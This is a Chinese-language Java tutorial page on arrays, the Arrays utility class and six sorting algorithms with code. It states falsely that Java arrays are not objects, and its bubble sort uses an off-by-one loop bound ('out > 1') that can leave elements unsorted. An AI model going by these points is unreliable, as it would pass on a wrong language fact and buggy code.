                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Java数组详解</h2>
<h3 data-id="heading-1">1. 数组概述</h3>
<p>数组是同一种类型数据的集合，用来存储同类型数据的容器。我们将容器中的数据称为元素。</p>
<h4 data-id="heading-2">数组的特点</h4>
<ol>
<li>
<p><strong>数组没有API</strong>：数组不是对象，而是一堆数据的集合容器，因此没有可查阅的API文档。</p>
</li>
<li>
<p><strong>唯一的length属性</strong>：数组只有一个<code>length</code>属性（注意不是<code>length()</code>方法）。数组的长度在初始化时就固定了，无法改变。</p>
</li>
<li>
<p><strong>没有内置方法</strong>：数组本身没有任何方法，但我们可以使用<code>Arrays</code>工具类来操作数组。该类提供了数组相关的一系列静态方法。</p>
</li>
</ol>
<h3 data-id="heading-3">2. 数组定义</h3>
<h4 data-id="heading-4">定义方式一：指定长度</h4>
<pre><code class="hljs language-java" lang="java">元素类型[] 数组名 = <span class="hljs-keyword">new</span> 元素类型[元素个数或者数组长度];
</code></pre>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];
</code></pre>
<h4 data-id="heading-5">定义方式二：直接初始化</h4>
<pre><code class="hljs language-java" lang="java">元素类型[] 数组名 = <span class="hljs-keyword">new</span> 元素类型[]{元素<span class="hljs-number">1</span>, 元素<span class="hljs-number">2</span>, ……};
</code></pre>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>};
</code></pre>
<p><strong>简化写法：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span>[] arr = {<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>};
</code></pre>
<h3 data-id="heading-6">3. 数组常用操作</h3>
<h4 data-id="heading-7">访问和修改元素</h4>
<pre><code class="hljs language-java" lang="java">数组名[角标位置]    <span class="hljs-comment">// 获得角标位置上的元素</span>
</code></pre>
<p>获取完该元素后，也可以将同类型的指定元素赋值给此元素，来改变数组内容。</p>
<h4 data-id="heading-8">获取数组长度</h4>
<pre><code class="hljs language-java" lang="java">数组名.length      <span class="hljs-comment">// 获取数组长度</span>
</code></pre>
<h3 data-id="heading-9">4. Arrays工具类详解</h3>
<h4 data-id="heading-10">概述</h4>
<p><code>Arrays</code>类位于<code>java.util</code>包中，专门用于数组操作。该类只包含静态方法。</p>
<h4 data-id="heading-11">主要功能</h4>
<p>为了扩展数组的应用，可以调用<code>Arrays.asList()</code>方法将数组转换成List集合，使用集合的思想和方法来操作数组元素。</p>
<h4 data-id="heading-12">常用方法</h4>

















































<table><thead><tr><th>方法名</th><th>功能描述</th></tr></thead><tbody><tr><td><code>binarySearch()</code></td><td>折半查找</td></tr><tr><td><code>copyOf()</code></td><td>复制数组</td></tr><tr><td><code>copyOfRange()</code></td><td>复制指定范围的数组</td></tr><tr><td><code>equals()</code></td><td>比较两个数组中的元素是否相同</td></tr><tr><td><code>deepEquals()</code></td><td>深度比较</td></tr><tr><td><code>fill()</code></td><td>替换值</td></tr><tr><td><code>hashCode()</code></td><td>获取哈希值</td></tr><tr><td><code>sort()</code></td><td>对数组进行升序排序</td></tr><tr><td><code>toString()</code></td><td>转换为字符串表示</td></tr><tr><td><code>asList(T… a)</code></td><td>将数组转换为List集合</td></tr></tbody></table>
<p>**注意：**集合转数组使用<code>toArray()</code>方法。</p>
<h4 data-id="heading-13">Arrays.asList()使用注意事项</h4>
<p>⚠️ <strong>重要提醒：</strong></p>
<ol>
<li>
<p><strong>不能使用增删方法</strong>：将数组变成集合后，不能使用集合的增删方法，因为数组长度固定。如果尝试增删会抛出<code>UnsupportedOperationException</code>异常。</p>
</li>
<li>
<p><strong>对象数组转换</strong>：如果数组中的元素都是对象，数组中的元素会直接转成集合中的元素。</p>
</li>
<li>
<p><strong>基本数据类型数组转换</strong>：如果数组中的元素都是基本数据类型，那么该数组作为集合中的元素存入。</p>
</li>
</ol>
<h3 data-id="heading-14">5. 数组排序算法</h3>
<p>以下是常见的数组排序算法实现：</p>
<h4 data-id="heading-15">完整示例代码</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SortDemo</span> {
    <span class="hljs-type">int</span> array[] = {<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">55</span>, <span class="hljs-number">44</span>, <span class="hljs-number">33</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">43</span>, <span class="hljs-number">64</span>, <span class="hljs-number">7</span>};
    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> array.length;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">SortDemo</span> <span class="hljs-variable">sd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SortDemo</span>();
        
        <span class="hljs-comment">// 选择要使用的排序算法</span>
        <span class="hljs-comment">// sd.bubbleSort();     // 1、冒泡排序</span>
        <span class="hljs-comment">// sd.selectionSort();  // 2、选择排序</span>
        <span class="hljs-comment">// sd.insertionSort();  // 3、插入排序</span>
        sd.mergeSort();         <span class="hljs-comment">// 4、归并排序</span>
        <span class="hljs-comment">// sd.shellSort();      // 5、希尔排序</span>
        <span class="hljs-comment">// sd.quickSort();      // 6、快速排序</span>

        <span class="hljs-comment">// 输出结果</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; sd.array.length; i++) {
            System.out.print(sd.array[i] + <span class="hljs-string">" "</span>);
        }
    }

    <span class="hljs-comment">// 交换两个元素位置的工具方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> index1, <span class="hljs-type">int</span> index2)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> array[index1];
        array[index1] = array[index2];
        array[index2] = temp;
    }
}
</code></pre>
<h4 data-id="heading-16">1. 冒泡排序（Bubble Sort）</h4>
<p><strong>算法原理：</strong></p>
<ul>
<li>逐次比较两个相邻数据的大小并交换位置</li>
<li>每次比较都找出当前范围内的最大项</li>
<li>时间复杂度：O(N²)</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> out, in;
    <span class="hljs-keyword">for</span> (out = index - <span class="hljs-number">1</span>; out &gt; <span class="hljs-number">1</span>; --out) {
        <span class="hljs-keyword">for</span> (in = <span class="hljs-number">0</span>; in &lt; out; ++in) {
            <span class="hljs-keyword">if</span> (array[in] &gt; array[in + <span class="hljs-number">1</span>]) {
                swap(in, in + <span class="hljs-number">1</span>);
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-17">2. 选择排序（Selection Sort）</h4>
<p><strong>算法原理：</strong></p>
<ul>
<li>对冒泡排序的优化版本</li>
<li>每次遍历记录最小值位置，遍历结束后再交换</li>
<li>减少了交换次数，只需要N次交换</li>
<li>时间复杂度：O(N²)</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">selectionSort</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> out, in;
    <span class="hljs-keyword">for</span> (out = <span class="hljs-number">0</span>; out &lt; index - <span class="hljs-number">1</span>; ++out) {
        <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> out;
        <span class="hljs-keyword">for</span> (in = out + <span class="hljs-number">1</span>; in &lt; index; ++in) {
            <span class="hljs-keyword">if</span> (array[in] &lt; array[temp]) {
                temp = in;
            }
        }
        swap(out, temp);
    }
}
</code></pre>
<h4 data-id="heading-18">3. 插入排序（Insertion Sort）</h4>
<p><strong>算法原理：</strong></p>
<ul>
<li>充分利用已排列好的数据</li>
<li>将未排序的数据插入到已排序队列的正确位置</li>
<li>每插入一个数据，已排序队列增加一个成员</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertionSort</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> out, in;
    <span class="hljs-keyword">for</span> (out = <span class="hljs-number">1</span>; out &lt; index; ++out) {
        <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> array[out];
        in = out;
        <span class="hljs-keyword">while</span> (in &gt; <span class="hljs-number">0</span> &amp;&amp; temp &lt; array[in - <span class="hljs-number">1</span>]) {
            array[in] = array[in - <span class="hljs-number">1</span>];
            --in;
        }
        array[in] = temp;
    }
}
</code></pre>
<h4 data-id="heading-19">4. 归并排序（Merge Sort）</h4>
<p><strong>算法原理：</strong></p>
<ul>
<li>将两个有序数组合并为一个有序数组</li>
<li>结合二分法递归地将数组依次归并</li>
<li>时间复杂度：O(N log N)</li>
<li>空间复杂度：需要额外开辟一倍的存储空间</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mergeSort</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span>[] newArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[index];
    recMergeSort(newArray, <span class="hljs-number">0</span>, index - <span class="hljs-number">1</span>);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recMergeSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] data, <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> upper)</span> {
    <span class="hljs-keyword">if</span> (low == upper) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> (low + upper) / <span class="hljs-number">2</span>;
    recMergeSort(data, mid + <span class="hljs-number">1</span>, upper);
    recMergeSort(data, low, mid);
    merge(data, low, mid + <span class="hljs-number">1</span>, upper);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">(<span class="hljs-type">int</span>[] data, <span class="hljs-type">int</span> lowStart, <span class="hljs-type">int</span> highStart, <span class="hljs-type">int</span> upperBound)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">lowBound</span> <span class="hljs-operator">=</span> lowStart;
    <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> highStart - <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> upperBound - lowStart + <span class="hljs-number">1</span>;

    <span class="hljs-keyword">while</span> (lowStart &lt;= mid &amp;&amp; highStart &lt;= upperBound) {
        <span class="hljs-keyword">if</span> (array[lowStart] &lt; array[highStart]) {
            data[j++] = array[lowStart++];
        } <span class="hljs-keyword">else</span> {
            data[j++] = array[highStart++];
        }
    }

    <span class="hljs-keyword">while</span> (lowStart &lt;= mid) {
        data[j++] = array[lowStart++];
    }

    <span class="hljs-keyword">while</span> (highStart &lt;= upperBound) {
        data[j++] = array[highStart++];
    }

    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; num; j++) {
        array[lowBound + j] = data[j];
    }
}
</code></pre>
<h4 data-id="heading-20">5. 希尔排序（Shell Sort）</h4>
<p><strong>算法原理：</strong></p>
<ul>
<li>插入排序的高级版本</li>
<li>将每次比较的间隔扩大，让数据在大范围内移动</li>
<li>逐渐缩小间隔，最终完成排序</li>
<li>使用Knuth间隔序列：h = h * 3 + 1</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shellSort</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> in, out;
    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> temp;
    
    <span class="hljs-comment">// 计算最大间隔</span>
    <span class="hljs-keyword">while</span> (h &lt; index / <span class="hljs-number">3</span>) {
        h = h * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;
    }
    
    <span class="hljs-keyword">while</span> (h &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">for</span> (out = h; out &lt; index; ++out) {
            temp = array[out];
            in = out;
            <span class="hljs-keyword">while</span> (in &gt; h - <span class="hljs-number">1</span> &amp;&amp; array[in - h] &gt; temp) {
                array[in] = array[in - h];
                in -= h;
            }
            array[in] = temp;
        }
        h = (h - <span class="hljs-number">1</span>) / <span class="hljs-number">3</span>;
    }
}
</code></pre>
<h4 data-id="heading-21">6. 快速排序（Quick Sort）</h4>
<p><strong>算法原理：</strong></p>
<ul>
<li>选择一个基准值（pivot）</li>
<li>将小于pivot的数据放在左侧，大于pivot的放在右侧</li>
<li>对左右两侧分别递归执行相同策略</li>
<li>平均时间复杂度：O(N log N)</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quickSort</span><span class="hljs-params">()</span> {
    recQuickSort(<span class="hljs-number">0</span>, index - <span class="hljs-number">1</span>);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recQuickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> right - left + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">3</span>) {
        manualSort(left, right);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">pivot</span> <span class="hljs-operator">=</span> median(left, right);
        <span class="hljs-type">int</span> <span class="hljs-variable">partition</span> <span class="hljs-operator">=</span> partition(left, right, pivot);
        recQuickSort(left, partition - <span class="hljs-number">1</span>);
        recQuickSort(partition + <span class="hljs-number">1</span>, right);
    }
}

<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">partition</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right, <span class="hljs-type">int</span> pivot)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">leftPtr</span> <span class="hljs-operator">=</span> left;
    <span class="hljs-type">int</span> <span class="hljs-variable">rightPtr</span> <span class="hljs-operator">=</span> right - <span class="hljs-number">1</span>;
    
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-keyword">while</span> (array[++leftPtr] &lt; pivot);
        <span class="hljs-keyword">while</span> (array[--rightPtr] &gt; pivot);
        
        <span class="hljs-keyword">if</span> (leftPtr &gt;= rightPtr) {
            <span class="hljs-keyword">break</span>;
        } <span class="hljs-keyword">else</span> {
            swap(leftPtr, rightPtr);
        }
    }
    swap(leftPtr, right - <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> leftPtr;
}

<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">median</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">center</span> <span class="hljs-operator">=</span> (left + right) / <span class="hljs-number">2</span>;
    <span class="hljs-keyword">if</span> (array[left] &gt; array[center]) {
        swap(left, center);
    }
    <span class="hljs-keyword">if</span> (array[left] &gt; array[right]) {
        swap(left, right);
    }
    <span class="hljs-keyword">if</span> (array[center] &gt; array[right]) {
        swap(center, right);
    }
    swap(center, right - <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> array[right - <span class="hljs-number">1</span>];
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">manualSort</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> right - left + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">2</span>) {
        <span class="hljs-keyword">if</span> (array[left] &gt; array[right])
            swap(left, right);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">if</span> (array[left] &gt; array[right - <span class="hljs-number">1</span>])
            swap(left, right - <span class="hljs-number">1</span>);
        <span class="hljs-keyword">if</span> (array[left] &gt; array[right])
            swap(left, right);
        <span class="hljs-keyword">if</span> (array[right - <span class="hljs-number">1</span>] &gt; array[right])
            swap(right - <span class="hljs-number">1</span>, right);
    }
}
</code></pre>
<h3 data-id="heading-22">6. 常见异常</h3>
<h4 data-id="heading-23">ArrayIndexOutOfBoundsException</h4>
<p><strong>角标越界异常</strong></p>
<ul>
<li><strong>原因：</strong> 操作数组时访问了数组中不存在的索引位置</li>
<li><strong>解决：</strong> 确保访问的索引在 0 到 array.length-1 的范围内</li>
</ul>
<h4 data-id="heading-24">NullPointerException</h4>
<p><strong>空指针异常</strong></p>
<ul>
<li><strong>原因：</strong> 当引用没有指向任何对象（值为null）时，仍然尝试使用该引用操作实体</li>
<li><strong>解决：</strong> 在使用数组前先判断是否为null</li>
</ul>
<h3 data-id="heading-25">总结</h3>
<p>数组是Java中最基础的数据结构之一，掌握数组的操作和各种排序算法对提升编程能力非常重要。在实际开发中：</p>
<ol>
<li>优先使用<code>Arrays</code>工具类进行数组操作</li>
<li>根据数据规模选择合适的排序算法</li>
<li>注意数组越界和空指针异常的防范</li>
<li>合理使用数组转集合的功能，但要注意其限制</li>
</ol>
<hr/>
<p><em>本文整理了Java数组的核心知识点，包括基本概念、常用操作、工具类使用和各种排序算法的实现，希望对Java学习者有所帮助。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IO流6（转换流、序列化与反序列化流）]]></title>    <link>https://juejin.cn/post/7592068193419591689</link>    <guid>https://juejin.cn/post/7592068193419591689</guid>    <pubDate>2026-01-06T09:51:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592068193419591689" data-draft-id="7592058763986501678" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IO流6（转换流、序列化与反序列化流）"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-06T09:51:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="makinohara"/> <meta itemprop="url" content="https://juejin.cn/user/455637552340731"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IO流6（转换流、序列化与反序列化流）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/455637552340731/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    makinohara
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:51:11.000Z" title="Tue Jan 06 2026 09:51:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body 